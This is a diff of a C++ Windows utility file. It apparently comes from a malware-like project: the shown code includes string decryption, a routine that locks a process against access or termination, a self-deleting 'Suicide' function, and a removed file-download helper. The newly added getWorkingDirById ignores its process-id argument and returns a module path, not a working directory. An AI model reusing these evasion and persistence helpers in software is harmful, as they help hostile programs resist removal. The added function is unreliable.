@@ -16,12 +16,6 @@ bool Utils::FileExists(const char *fname)
 	return access(fname, 0) != -1;
 }
 
-/* Download File */
-void Utils::DownloadFile(wchar_t *url, wchar_t *dir)
-{
-	URLDownloadToFile(0, url, dir, 0, 0);
-}
-
 /* Create Dir */
 void Utils::CreateDir(wchar_t *dir)
 {
@@ -49,10 +43,9 @@ char* Utils::UnEnc(char *enc, char *key, DWORD encLen)
 
 // Win API ============================================================================
 
-/* Deny Access to this process */
+/* Deny Access to process on pId */
 BOOL Utils::DenyAccessToId(DWORD pId)
 {
-	cout << "procID: " << pId;
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId);
 	SECURITY_ATTRIBUTES sa;
 	TCHAR * szSD = TEXT("D:P");
@@ -140,6 +133,31 @@ string Utils::getProcessName(DWORD pId)
 
 	return arr_s;
 }
+// get working dir from pId
+string Utils::getWorkingDirById(DWORD pId)
+{
+	HANDLE processHandle = NULL;
+	TCHAR filename[MAX_PATH];
+
+	processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, GetCurrentProcessId());
+	if (processHandle != NULL) {
+		if (GetModuleFileNameEx(processHandle, NULL, filename, MAX_PATH) == 0) {
+			//cerr << "Failed to get module filename." << endl;
+		}
+		else {
+			//printf((char*)filename);
+		}
+		CloseHandle(processHandle);
+	}
+	else {
+		//cerr << "Failed to open process." << endl;
+	}
+
+	std::wstring arr_w(filename);
+	std::string arr_s(arr_w.begin(), arr_w.end());
+
+	return arr_s;
+}
 
 string Utils::getCurrentWorkDir()
 {
@@ -174,8 +192,14 @@ void Utils::Suicide()
 	system(command.c_str());
 }
 
-// PowerShell =========================================================================
-void CreateRestoreScript()
+std::wstring Utils::s2ws(const std::string& s)
 {
-
+	int len;
+	int slength = (int)s.length() + 1;
+	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
+	wchar_t* buf = new wchar_t[len];
+	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
+	std::wstring r(buf);
+	delete[] buf;
+	return r;
 }
